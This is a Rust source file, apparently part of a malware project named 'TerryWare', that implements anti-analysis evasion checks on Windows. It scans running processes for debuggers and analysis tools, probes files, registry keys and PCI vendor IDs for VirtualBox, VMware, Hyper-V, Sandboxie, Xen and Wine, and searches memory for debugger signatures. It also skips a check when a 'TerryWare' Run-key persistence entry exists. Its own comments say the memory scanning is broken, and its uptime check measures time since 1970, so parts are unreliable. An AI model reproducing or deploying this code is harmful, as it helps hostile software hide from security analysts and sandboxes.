use std::time::SystemTime;
use std::process::exit;
use std::thread;
use std::env;
use winreg::RegKey;
use winreg::enums::HKEY_CURRENT_USER;
use winreg::enums::KEY_READ;
use std::mem;
use winapi::um::sysinfoapi::{SYSTEM_INFO, GetSystemInfo};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;
use winreg::enums::HKEY_LOCAL_MACHINE;
use winapi::um::winnt::MEMORY_BASIC_INFORMATION;
use rand::Rng;
use sysinfo::System;
use colored::*;
use windows::Win32::System::Memory::{VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
use windows::Win32::System::Memory::VirtualQuery;

pub struct EvasionCheck;

impl EvasionCheck {
    pub fn check_environment() -> bool {
        println!("[+] Starting environment checks...");
        let mut suspicious_environment = false;

        // System Uptime Check
        println!("[+] Checking system uptime...");
        let skip_check = if let Ok(hkcu) = RegKey::predef(HKEY_CURRENT_USER)
            .open_subkey_with_flags(r"Software\Microsoft\Windows\CurrentVersion\Run", KEY_READ) {
            hkcu.get_value::<String, _>("TerryWare").is_ok()
        } else {
            false
        };

        if !skip_check {
            if let Ok(uptime) = SystemTime::now().duration_since(SystemTime::UNIX_EPOCH) {
                if uptime.as_secs() < 120 {
                    println!("{} Suspicious uptime detected:\n    {} seconds", "[!]".red(), uptime.as_secs());
                    suspicious_environment = true;
                } else {
                    println!("{} Uptime normal: {} seconds", "[+]".green(), uptime.as_secs());
                }
            }
        }

        // Process Check
        println!("[+] Checking for analysis tools...");
        match Self::check_analysis_processes() {
            (true, found) => {
                println!("{} Analysis tools detected:\n    {}", "[!]".red(), found);
                suspicious_environment = true;
            },
            (false, _) => println!("[+] No analysis tools found"),
        }

        // VM Artifacts
        println!("[+] Checking VM artifacts...");
        match Self::check_vm_artifacts() {
            (true, found) => {
                println!("{} VM artifacts detected: {}", "[!]".red(), found);
                suspicious_environment = true;
            },
            (false, _) => println!("[+] No VM artifacts found"),
        }

        // Registry Check
        println!("[+] Checking registry for VM traces...");
        match Self::check_vm_registry() {
            (true, found) => {
                println!("{} VM registry artifacts detected: {}", "[!]".red(), found);
                suspicious_environment = true;
            },
            (false, _) => println!("[+] No VM registry artifacts found"),
        }

        // Memory Check
        println!("[+] Checking memory patterns...");
        match Self::check_suspicious_memory() {
            (true, found) => {
                println!("{} Suspicious memory patterns detected: {}", "[!]".red(), found);
                suspicious_environment = true;
            },
            (false, _) => println!("[+] No suspicious memory patterns found"),
        }

        println!("[+] Environment checks complete.");
        !suspicious_environment
    }

    fn check_analysis_processes() -> (bool, String) {
        println!("[+] Enumerating processes...");
        let mut sys = System::new_all();
        sys.refresh_all();
        
        let suspicious_processes = [
            "procmon", "processhacker",
            "ida", "x64dbg", "ollydbg", "ghidra", 
            "radare2", "cutter", "binary ninja", 
            "cuckoo", "objdump", "wireshark"
        ];
        
        let mut found_processes = Vec::new();
        
        for (_, process) in sys.processes() {
            let process_name = process.name().to_string_lossy().to_ascii_lowercase();
            for suspicious in &suspicious_processes {
                if process_name.contains(suspicious) {
                    found_processes.push(process_name.to_string());
                }
            }
        }

        if !found_processes.is_empty() {
            (true, found_processes.join(", "))
        } else {
            (false, String::new())
        }
    }

    fn check_vm_artifacts() -> (bool, String) {
        let suspicious_paths = [
            "C:\\Windows\\System32\\Vmms.exe",
            "C:\\Windows\\System32\\vm3dservice.exe",
            "/usr/bin/vmware",
            "/usr/bin/virtualbox"
        ];

        // Check suspicious paths
        for path in &suspicious_paths {
            if std::path::Path::new(path).exists() {
                return (true, format!("Found VM-related file:\n    {}", path));
            }
        }

        if let Ok(computername) = env::var("COMPUTERNAME") {
            let comp_lower = computername.to_lowercase();
            if comp_lower.contains("virtual") || comp_lower.contains("vm") {
                return (true, format!("Suspicious computer name:\n    {}", computername));
            }
        }

        (false, String::new())
    }

    fn check_vm_registry() -> (bool, String) {
        let registry_paths = [
            // General
            (HKEY_LOCAL_MACHINE, r"Software\Classes\Folder\shell\sandbox"),
            
            // Hyper-V
            (HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Hyper-V"),
            (HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\VirtualMachine"),
            (HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\vmicheartbeat"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\vmicvss"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\vmicshutdown"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\vmicexchange"),
            
            // Sandboxie
            (HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\SbieDrv"),
            (HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Sandboxie"),
            
            // VirtualBox
            (HKEY_LOCAL_MACHINE, r"HARDWARE\ACPI\DSDT\VBOX__"),
            (HKEY_LOCAL_MACHINE, r"HARDWARE\ACPI\FADT\VBOX__"),
            (HKEY_LOCAL_MACHINE, r"HARDWARE\ACPI\RSDT\VBOX__"),
            (HKEY_LOCAL_MACHINE, r"SOFTWARE\Oracle\VirtualBox Guest Additions"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\VBoxGuest"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\VBoxMouse"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\VBoxService"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\VBoxSF"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\VBoxVideo"),
            
            // VirtualPC
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\vpcbus"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\vpc-s3"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\vpcuhub"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\msvmmouf"),
            
            // VMware
            (HKEY_CURRENT_USER, r"SOFTWARE\VMware, Inc.\VMware Tools"),
            (HKEY_LOCAL_MACHINE, r"SOFTWARE\VMware, Inc.\VMware Tools"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\vmdebug"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\vmmouse"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\VMTools"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\VMMEMCTL"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\vmware"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\vmci"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\vmx86"),
            
            // Wine
            (HKEY_CURRENT_USER, r"SOFTWARE\Wine"),
            (HKEY_LOCAL_MACHINE, r"SOFTWARE\Wine"),
            
            // Xen
            (HKEY_LOCAL_MACHINE, r"HARDWARE\ACPI\DSDT\xen"),
            (HKEY_LOCAL_MACHINE, r"HARDWARE\ACPI\FADT\xen"),
            (HKEY_LOCAL_MACHINE, r"HARDWARE\ACPI\RSDT\xen"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\xenevtchn"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\xennet"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\xennet6"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\xensvc"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\xenvdb"),
        ];
        let pci_vendors = [
            (r"SYSTEM\CurrentControlSet\Enum\PCI\VEN_1AB8"), // Parallels
            (r"SYSTEM\CurrentControlSet\Enum\PCI\VEN_80EE"), // VirtualBox
            (r"SYSTEM\CurrentControlSet\Enum\PCI\VEN_5333"), // VirtualPC
            (r"SYSTEM\CurrentControlSet\Enum\PCI\VEN_15AD"), // VMware
        ];
        let vmware_devices = [
            r"SYSTEM\CurrentControlSet\Enum\IDE\CdRomNECVMWar_VMware_IDE_CD",
            r"SYSTEM\CurrentControlSet\Enum\IDE\CdRomNECVMWar_VMware_SATA_CD",
            r"SYSTEM\CurrentControlSet\Enum\IDE\DiskVMware_Virtual_IDE_Hard_Drive",
            r"SYSTEM\CurrentControlSet\Enum\IDE\DiskVMware_Virtual_SATA_Hard_Drive",
        ];

        // Check regular registry paths
        for (hkey, path) in &registry_paths {
            if RegKey::predef(*hkey)
                .open_subkey_with_flags(path, KEY_READ)
                .is_ok()
            {
                return (true, format!("\n    Found VM registry key: {}", path));
            }
        }

        // Partial PCI Vendor Match
        let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
        for vendor in &pci_vendors {
            if hklm.open_subkey_with_flags(vendor, KEY_READ).is_ok() {
                return (true, format!("\n    Found VM PCI vendor: {}", vendor));
            }
        }

        // Partial VMWare Match
        for device in &vmware_devices {
            if hklm.open_subkey_with_flags(device, KEY_READ).is_ok() {
                return (true, format!("\n    Found VMware device: {}", device));
            }
        }

        (false, String::new())
    }

    fn check_suspicious_memory() -> (bool, String) {
        println!("[+] Starting memory analysis...");
        
        // Try to allocate and scan a small memory region
        // This part of the program still needs work, but still uploading in the meantime
        // Memory scanning doesn't work as intended right now
        unsafe {
            let size = 1024 * 1024; // 1MB test region
            let buffer = VirtualAlloc(
                None,
                size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE
            );
            
            if buffer.is_null() {
                return (true, "\n    Failed to allocate memory for testing".to_string());
            }

            let test_pattern = b"TEST_PATTERN";
            std::ptr::copy_nonoverlapping(
                test_pattern.as_ptr(),
                buffer.cast::<u8>(),
                test_pattern.len()
            );
            
            let mut read_buffer = vec![0u8; test_pattern.len()];
            std::ptr::copy_nonoverlapping(
                buffer.cast::<u8>(),
                read_buffer.as_mut_ptr(),
                test_pattern.len()
            );
            
            if read_buffer != test_pattern {
                return (true, "\n    Memory read/write test failed".to_string());
            }
            
            let scan_size = 4096;
            let mut scan_buffer = vec![0u8; scan_size];
            for offset in (0..size-scan_size).step_by(scan_size) {
                let addr = buffer.add(offset);
                if let Some(mem_content) = Self::read_memory_safely(addr.cast(), scan_size) {
                    if let Some(sig) = Self::check_signatures(&mem_content) {
                        return (true, format!("\n    Found signature '{}' at offset: 0x{:X}", sig, offset));
                    }
                }
            }
        }
        
        println!("[+] Memory analysis complete");
        (false, String::new())
    }
    
    fn read_memory_safely(addr: *const u8, size: usize) -> Option<Vec<u8>> {
        unsafe {
            match std::ptr::read_volatile(addr) {
                _ => {
                    let mut buffer = Vec::with_capacity(size);
                    buffer.set_len(size);
                    
                    let result = std::panic::catch_unwind(move || {
                        std::ptr::copy_nonoverlapping(addr, buffer.as_mut_ptr(), size);
                        buffer
                    });
                    
                    result.ok()
                }
            }
        }
    }
    
    fn check_signatures(mem_content: &[u8]) -> Option<String> {
        let signatures: &[&[u8]] = &[
            b"DBG", b"DEBUG", b"TRACE",
            b"WINDBG", b"OLLYDBG", b"IDA",
            b"x64dbg", b"immunity", b"radare2",
            b"SANDBOX", b"VIRTUAL", b"QEMU",
            b"VMware", b"VirtualBox", b"WINE"
        ];
    
        for sig in signatures {
            if mem_content.windows(sig.len()).any(|window| window == *sig) {
                return Some(String::from_utf8_lossy(sig).to_string());
            }
        }
        
        None
    }

    pub fn start_monitoring() -> (Arc<AtomicBool>, thread::JoinHandle<()>) {
        let is_running = Arc::new(AtomicBool::new(true));
        let monitor_running = is_running.clone();
        
        let handle = thread::spawn(move || {
            while monitor_running.load(Ordering::SeqCst) {
                if !monitor_running.load(Ordering::SeqCst) { break; }
                if Self::check_analysis_processes().0 {
                    println!("[!] Analysis tool detected!");
                }
                
                if !monitor_running.load(Ordering::SeqCst) { break; }
                if Self::check_vm_artifacts().0 {
                    println!("[!] VM environment detected!");
                }
                
                if !monitor_running.load(Ordering::SeqCst) { break; }
                if Self::check_suspicious_memory().0 {
                    println!("[!] Suspicious memory patterns detected!");
                }
                
                if !monitor_running.load(Ordering::SeqCst) { break; }
                if Self::check_vm_registry().0 {
                    println!("[!] VM registry artifacts detected!");
                }
                
                if !monitor_running.load(Ordering::SeqCst) { break; }
                thread::sleep(Duration::from_secs(1));
            }
        });
        
        (is_running, handle)
    }
    
    pub fn stop_monitoring(mut monitor: (Arc<AtomicBool>, thread::JoinHandle<()>)) -> bool {
        monitor.0.store(false, Ordering::SeqCst);
        
        match monitor.1.join() {
            Ok(_) => {
                println!("[+] Monitoring stopped.");
                true
            }
            Err(_) => {
                println!("{} Warning: Monitoring thread did not stop cleanly\n    Thread join failed", "[!]".red());
                false
            }
        }
    }

    /// Delay Function
    pub fn add_delays() {
        let mut rng = rand::thread_rng();
        let delay = rng.gen_range(100..=1000);
        thread::sleep(Duration::from_millis(delay));
    }
}

pub fn run_evasion_checks() -> bool {
    let create_test_pattern = true;
    
    // Either this is busted or the actual memory scanning is busted
    // I'll fix later
    let buffer = if create_test_pattern {
        unsafe {
            // Increased size to make pattern more likely to be found
            let size = 1024 * 1024; // 1MB instead of 1KB
            let buffer = VirtualAlloc(
                None,
                size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE
            );
            
            if !buffer.is_null() {
                // Write multiple debug signatures to increase detection chance
                let pattern = b"DEBUG\0SANDBOX\0VMware\0TRACE\0";
                std::ptr::copy_nonoverlapping(
                    pattern.as_ptr(),
                    buffer.cast::<u8>(),
                    pattern.len()
                );
                
                println!("{} Created memory with multiple test patterns at: {:p}", "[+]".yellow(), buffer);
                Some(buffer)
            } else {
                None
            }
        }
    } else {
        None
    };

    EvasionCheck::add_delays();
    let result = EvasionCheck::check_environment();

    if let Some(_) = buffer {
        println!("{} Test patterns were active during scan", "[+]".yellow());
    }

    result
} 